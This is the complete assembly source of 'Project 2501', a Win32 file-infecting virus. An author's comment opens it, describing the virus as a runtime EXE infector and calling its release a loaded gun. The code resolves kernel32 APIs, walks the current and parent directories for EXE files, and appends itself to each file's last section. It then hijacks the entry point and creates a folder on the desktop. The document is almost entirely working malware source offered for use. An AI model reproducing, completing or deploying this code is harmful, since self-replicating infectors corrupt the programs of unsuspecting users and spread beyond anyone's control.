comment * 

Name: Project 2501
OS:   Win32 
Coder Belial

Heya ,
this is my first Pe-infector.Wow ,a great feeling
to have finished it.
Credits go out to Lord Julus and BillyBelcebub ,because
of their win32 tuturials.Without them ,i would  never
have finished this creation.It took me nearly a year to of reading
to understand all the important aspects of Win32-Assembly.
Greetings go out Wallo ,Raven and the whole Virus-channel on undernet.
Also greetings to BillyBoy from Micro$oft.Thanx for your
nice viriiparadise-OS.But not soooooo much bugs in future ,ok?

I tested this virus only under Win98 ,so I dont know
wether it works under WinME ,WinNT or Win95.But Im sure somebody will try
it out.
The Virus is a runtime exe infector.It infects all files
in current dir and all his subdirectories.After this ,it makes
one dotdot and infects new files and subdirs until it is
in c:\ or five dotdots are done.The only payload my virus has
is a directory on the desktop named "Project2501".It is
created each run.Im thinking of putting a txtfile
in this directory ,but I have no real motivation
at the moment.A bedder payload is in progress.And
a nice encryption ,I hope.If you think this virus
may be a bit incomplete (no encryption and no kewl
payload) than i have to say:
With releasing this source i release a loaded
gun.In the wrong hands ,it could be awful for some
harmless user.So if I release guns I dont want to release
"full-automatic-guns" .Thats for now


BeLiAL

*

.586
.model flat

.data

db 0
db 'This is the first generation of project2501'

.code

start:
call delta_setup

delta_setup:
pop ebp
sub ebp,offset delta_setup

get_those_apis:
mov eax,dword ptr [esp]
and eax,0ffff0000h
mov ecx,0
call find_mz_and_pe
call find_all_apis

Infection_part:
mov byte ptr [ebp+dir_counter],0
mov byte ptr [ebp+am_i_up],0
mov eax,dword ptr [ebp+image_base]
mov dword ptr [ebp+image_base2],eax
mov eax,dword ptr [ebp+old_entry_point]
mov dword ptr [ebp+old_entry_point2],eax
call seek_and_destroy

payload_part:
call payload

reanimation_part:
cmp ebp,0
je exit_here
mov eax,dword ptr [ebp+image_base2] 
add eax,dword ptr [ebp+old_entry_point2]
jmp eax

exit_here:
push 0
call [ebp+ExitProcess]

find_mz_and_pe  proc
add ecx,1
cmp ecx,11
je mz_not_found
mov bx,word ptr [eax]
cmp bx,'ZM'
je find_the_pe
sub eax,010000h
jmp find_mz_and_pe
find_the_pe:
mov esi,eax
mov ebx,dword ptr [eax+3ch]
add eax,ebx
mov bx,word ptr [eax]
cmp bx,'EP'
jne mz_not_found
mov dword ptr [ebp+kernelbase],esi
mov dword ptr [ebp+kernelpeheader],eax
ret
mz_not_found:
jmp reanimation_part

find_mz_and_pe endp 

find_apis  proc
pop esi
pop eax
mov dword ptr [ebp+apinameoffset],eax
pop eax
mov dword ptr [ebp+apilenght],eax
pop eax
mov dword ptr [ebp+putitthere],eax
push esi
mov eax,dword ptr [ebp+kernelpeheader]
mov esi,dword ptr [eax+78h]
add esi,dword ptr [ebp+kernelbase]
add esi,1ch
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kernelbase]
mov dword ptr [ebp+adress_table_VA],eax
add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kernelbase]
mov dword ptr [ebp+name_table_VA],eax
add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kernelbase]
mov dword ptr [ebp+ordinal_table_VA],eax
mov esi,dword ptr [ebp+name_table_VA]
mov dword ptr [ebp+apicounter],00000000h
find_the_name:
push esi
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kernelbase]
mov esi,eax
mov edi,dword ptr [ebp+apinameoffset]
mov ecx,0
mov cl,byte ptr [ebp+apilenght]
cld
rep cmpsb
jz we_found_it
pop esi
add esi,4                       
inc dword ptr [ebp+apicounter]
jmp find_the_name
we_found_it:
pop esi                                 ;taken from BillyBel
mov eax,dword ptr [ebp+apicounter]
shl eax,1
add eax,dword ptr [ebp+ordinal_table_VA]
mov esi,0
xchg eax,esi
lodsw
shl eax,2
add eax,dword ptr [ebp+adress_table_VA]
mov esi,eax
lodsd
add eax,dword ptr [ebp+kernelbase]
mov ecx,dword ptr [ebp+putitthere]
mov dword ptr [ecx],eax
ret

find_apis  endp

find_all_apis proc
lea eax,[ebp+offset ExitProcess]
push eax
push dword ptr [ebp+exitprocesslenght]
lea eax,[ebp+offset _ExitProcess]
push eax
call find_apis
lea eax,[ebp+offset FindFirstFileA]
push eax
push dword ptr [ebp+findfirstfilelenght]
lea eax,[ebp+offset _FindFirstFileA]
push eax
call find_apis
lea eax,[ebp+offset FindNextFileA]
push eax
push dword ptr [ebp+findnextfilelenght]
lea eax,[ebp+offset _FindNextFileA]
push eax
call find_apis
lea eax,[ebp+offset CreateFileA]
push eax
push dword ptr [ebp+createfilelenght]
lea eax,[ebp+offset _CreateFileA]
push eax
call find_apis
lea eax,[ebp+offset CloseHandle]
push eax
push dword ptr [ebp+closehandlelenght]
lea eax,[ ebp+offset _CloseHandle]
push eax
call find_apis
lea eax,[ebp+offset CreateFileMappingA]
push eax
push dword ptr [ebp+createfilemappinglenght]
lea eax,[ebp+offset _CreateFileMappingA]
push eax
call find_apis
lea eax,[ebp+offset MapViewOfFile]
push eax
push dword ptr [ebp+mapviewoffilelenght]
lea eax,[ebp+offset _MapViewOfFile]
push eax
call find_apis
lea eax,[ebp+offset UnmapViewOfFile]
push eax
push dword ptr [ebp+unmapviewoffilelenght]
lea eax,[ebp+offset _UnmapViewOfFile]
push eax
call find_apis
lea eax,[ebp+offset GetFileSize]
push eax
push dword ptr [ebp+getfilesizelenght]
lea eax,[ebp+offset _GetFileSize]
push eax
call find_apis
lea eax,[ebp+offset SetFilePointer]
push eax
push dword ptr [ebp+setfilepointerlenght]
lea eax,[ebp+offset _SetFilePointer]
push eax
call find_apis
lea eax,[ebp+offset SetEndOfFile]
push eax
push dword ptr [ebp+setendoffilelenght]
lea eax,[ebp+offset _SetEndOfFile]
push eax
call find_apis
lea eax,[ebp+offset SetCurrentDirectoryA]
push eax
push dword ptr [ebp+setcurrentdirectorylenght]
lea eax,[ebp+offset _SetCurrentDirectoryA]
push eax
call find_apis
lea eax,[ebp+offset CreateDirectoryA]
push eax
push dword ptr [ebp+createdirectorylenght]
lea eax,[ebp+offset _CreateDirectoryA]
push eax
call find_apis
ret
find_all_apis  endp

seek_and_destroy  proc
find_first_file:
mov byte ptr [ebp+infection_flag],0
lea eax,[ebp+offset FindFileData]
push eax
lea eax,[ebp+offset tosearch]
push eax
call [ebp+FindFirstFileA]
mov dword ptr [ebp+findfilehandle],eax
inc eax
jz no_files_left
jmp open_the_file
find_next_file:
mov byte ptr [ebp+infection_flag],0
lea eax,[ebp+offset FindFileData]
push eax
push dword ptr [ebp+findfilehandle]
call [ebp+FindNextFileA]
test eax,eax
jz no_files_left
open_the_file:
push 0
push 0
push 3
push 0
push 1
push 80000000h + 40000000h
lea eax,[ebp+offset FindFileData.cFileName]
push eax
call [ebp+CreateFileA]
cmp eax,0ffffffffh
je find_next_file
mov dword ptr [ebp+filehandle],eax
push 0
push dword ptr [ebp+filehandle]
Call [ebp+GetFileSize]
calculate_new_size:
mov dword ptr [ebp+thefilesize],eax
add eax,virus_end-start
add eax,100
now_make_file_mapping:
push 0
push eax
push 0
push 4
push 0
push dword ptr [ebp+filehandle]
call [ebp+CreateFileMappingA]
mov dword ptr [ebp+filemappinghandle],eax
mov eax,dword ptr [ebp+thefilesize]
add eax,virus_end-start
add eax,100
push eax
push 0
push 0
push 2
push dword ptr [ebp+filemappinghandle]
call [ebp+MapViewOfFile]
mov dword ptr [ebp+mapadress],eax
cmp word ptr [eax],'ZM'
jne search_another
mov ebx,0
mov bx,word ptr [eax+3ch]
cmp word ptr [eax+ebx],'EP'
jne search_another
cmp word ptr [eax+38h],'AA'
je search_another
call infect_file
search_another:
cmp byte ptr [ebp+infection_flag],1
je close_normal
call close_not_normal
close_normal:
push dword ptr [ebp+mapadress]
call [ebp+UnmapViewOfFile]
push dword ptr [ebp+filemappinghandle]
call  [ebp+CloseHandle]
push dword ptr [ebp+filehandle]
call [ebp+CloseHandle]
jmp find_next_file

no_files_left:
cmp byte ptr [ebp+am_i_up],1
je go_down
lea eax,[ebp+offset FindFileData]
push eax
lea eax,[ebp+offset allfiles]
push eax
call [ebp+FindFirstFileA]
mov dword ptr [ebp+dir_search_handle],eax
inc eax
jz no_dirs_left
cmp byte ptr [ebp+FindFileData.cFileName],'.'
je find_next_dir
jmp is_it_dir
find_next_dir:
lea eax,[ebp+offset FindFileData]
push eax
push dword ptr [ebp+dir_search_handle]
call [ebp+FindNextFileA]
test eax,eax
jz no_dirs_left
cmp byte ptr [ebp+FindFileData.cFileName],'.'
je find_next_dir
is_it_dir:
cmp dword ptr [ebp+FindFileData.dwFileAttributes],10h
je it_is_dir
jmp find_next_dir
it_is_dir:
lea eax,[ebp+FindFileData.cFileName]
push eax
call [ebp+SetCurrentDirectoryA]
mov byte ptr [ebp+am_i_up],1
jmp find_first_file
no_dirs_left:
lea eax,[ebp+offset dotdot]
push eax
call [ebp+SetCurrentDirectoryA]
add byte ptr [ebp+dir_counter],1
cmp byte ptr [ebp+dir_counter],5
je all_for_now
mov byte ptr [ebp+am_i_up],0
jmp find_first_file
all_for_now:
ret
go_down:
lea eax,[ebp+offset dotdot]
push eax
call [ebp+SetCurrentDirectoryA]
mov byte ptr [ebp+am_i_up],0
jmp find_next_dir
seek_and_destroy endp

close_not_normal proc
push 0
push 0
push dword ptr [ebp+thefilesize]
push dword ptr [ebp+filehandle]
call [ebp+SetFilePointer]
push dword ptr [ebp+filehandle]
call [ebp+SetEndOfFile]
ret
close_not_normal endp

infect_file proc
mov byte ptr [ebp+infection_flag],1
mov eax,dword ptr [ebp+mapadress]
mov word ptr [eax+38h],'AA'
mov edi,0
mov di,word ptr [eax+3ch]
add eax,edi                              ;peheader at eax
mov dword ptr [ebp+peheader_offset],eax
mov esi,dword ptr [eax+28h]
mov dword ptr [ebp+old_entry_point],esi
mov esi,dword ptr [eax+3ch]
mov dword ptr [ebp+file_allign],esi
mov esi,dword ptr [eax+34h]
mov dword ptr [ebp+image_base],esi
mov esi,eax
go_to_last_section:
mov ebx,dword ptr [esi+74h]
shl ebx,3
mov eax,0
mov ax,word ptr [esi+6h]
dec eax
mov ecx,28h
mul ecx
add esi,78h
add esi,ebx
add esi,eax

modify_it:
or dword ptr [esi+24h],00000020h
or dword ptr [esi+24h],20000000h
or dword ptr [esi+24h],80000000h
mov eax, [esi+10h]    ;code taken from Lord Julus  (im not good in math)
mov dword ptr [ebp+old_raw_size],eax
add dword ptr [esi+8h],(offset virus_end - offset start)
mov eax,dword ptr [esi+8h]
mov ecx,dword ptr [ebp+file_allign]
div ecx
mov ecx,dword ptr [ebp+file_allign]
sub ecx,edx
mov dword ptr [esi+10h],eax
mov eax,dword ptr [esi+8h]
add eax,dword ptr [esi+10h]
mov dword ptr [esi+10h],eax
mov dword ptr [ebp+new_raw_size],eax
mov eax,dword ptr [esi+0ch]
add eax,dword ptr [esi+8h]
sub eax,(offset virus_end-offset start)
mov dword ptr [ebp+new_entry],eax
mov eax,dword ptr [ebp+old_raw_size]
mov ebx,dword ptr [ebp+new_raw_size]
sub ebx,eax
mov dword ptr [ebp+inc_raw_size],ebx
mov eax,dword ptr [esi+14h]
add eax,dword ptr [ebp+new_raw_size]
mov dword ptr [ebp+new_file_size],eax
mov eax,dword ptr [esi+14h]
add eax,dword ptr [esi+8]
sub eax,(offset virus_end-offset start)
add eax,dword ptr [ebp+mapadress]
mov edi,eax
lea esi,[ebp+offset start]
mov ecx,(offset virus_end-offset start)
rep movsb
mov esi,dword ptr [ebp+peheader_offset]
mov eax,dword ptr [ebp+new_entry]
mov dword ptr [esi+28h],eax
mov eax,dword ptr [ebp+inc_raw_size]
add dword ptr [esi+50h],eax
ret
infect_file endp

payload  proc
push 0
lea eax,[ebp+offset dir_name]
push eax
call [ebp+CreateDirectoryA]
ret
payload endp

new_file_size dd 0
inc_raw_size dd 0
new_entry    dd 0
new_raw_size dd 0
old_raw_size dd 0
file_allign dd 0
peheader_offset dd 0
image_base dd 0
old_entry_point dd 0
image_base2 dd 0
old_entry_point2 dd 0

kernelbase       dd 0
kernelpeheader   dd 0 
adress_table_VA  dd 0
name_table_VA    dd 0
ordinal_table_VA dd 0
apicounter       dd 00000000h
apinameoffset    dd 0
apilenght        dd 0
putitthere       dd 0

ExitProcess         dd 00000000h
_ExitProcess        db 'ExitProcess',0
exitprocesslenght   dd 12
FindFirstFileA      dd 00000000h
_FindFirstFileA     db 'FindFirstFileA',0
findfirstfilelenght dd 15
FindNextFileA       dd 00000000h
_FindNextFileA      db 'FindNextFileA',0
findnextfilelenght  dd 14
CreateFileA         dd 00000000h
_CreateFileA        db 'CreateFileA',0
createfilelenght    dd 12
CloseHandle         dd 00000000h
_CloseHandle        db 'CloseHandle',0
closehandlelenght   dd 12
CreateFileMappingA  dd 00000000h
_CreateFileMappingA db 'CreateFileMappingA',0
createfilemappinglenght dd 19
MapViewOfFile       dd 00000000h
_MapViewOfFile      db 'MapViewOfFile',0
mapviewoffilelenght db 14
UnmapViewOfFile     dd 00000000h
_UnmapViewOfFile    db 'UnmapViewOfFile',0
unmapviewoffilelenght dd 16
GetFileSize         dd 00000000h
_GetFileSize        db 'GetFileSize',0
getfilesizelenght   dd 12
SetEndOfFile        dd 00000000h
_SetEndOfFile       db 'SetEndOfFile',0
setendoffilelenght  dd 13
SetFilePointer      dd 00000000h
_SetFilePointer     db 'SetFilePointer',0
setfilepointerlenght      dd 15
SetCurrentDirectoryA      dd 0
_SetCurrentDirectoryA     db 'SetCurrentDirectoryA',0
setcurrentdirectorylenght dd 21
CreateDirectoryA          dd 0
_CreateDirectoryA         db 'CreateDirectoryA',0
createdirectorylenght     dd 17

mapadress           dd 0
infection_flag      db 0

tosearch              db '*.EXE',0
findfilehandle        dd 0
filehandle            dd 0
thefilesize           dd 0
filemappinghandle     dd 0
credit                db 'Project2501 was coded by BeLiAL'
                      db 'Greetings to a nice girl from scandinavia'
dotdot                db '..',0
allfiles              db '*.*',0
dir_search_handle     dd 0
am_i_up               db 0
dir_name              db 'c:\windows\desktop\Project2501',0
dir_counter           db 0

MAX_PATH  EQU 260
FILETIME struct
dwLowDateTime         DWORD   ?
dwHighDateTime        DWORD   ?      
FILETIME ends
WIN32_FIND_DATA struct
dwFileAttributes      DWORD ?
ftCreationTime        FILETIME <>
ftLastAccessTime      FILETIME <>        
ftLastWriteTime       FILETIME <>      
nFileSizeHigh         DWORD   ?        
nFileSizeLow          DWORD   ?      
dwReserved0           DWORD   ?       
dwReserved1           DWORD   ?       
cFileName             BYTE MAX_PATH dup(?)
cAlternate            BYTE 0eh dup(?)   
ends
FindFileData    WIN32_FIND_DATA <>
     
virus_end:
end start

